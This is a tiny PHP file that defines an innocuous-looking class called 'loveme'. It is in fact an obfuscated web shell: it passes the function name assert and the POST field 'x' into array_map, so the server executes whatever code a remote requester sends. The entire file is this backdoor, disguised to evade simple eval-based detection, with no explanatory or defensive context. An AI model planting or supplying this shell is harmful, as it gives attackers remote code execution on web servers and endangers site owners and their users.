<?php
class loveme {
    var $a;
    var $b;
    function __construct($a,$b) {
        $this->a=$a;
        $this->b=$b;
    }
    function test() {
       array_map($this->a,$this->b);
    }
}
$p1=new loveme(assert,array($_POST['x']));
$p1->test();
?>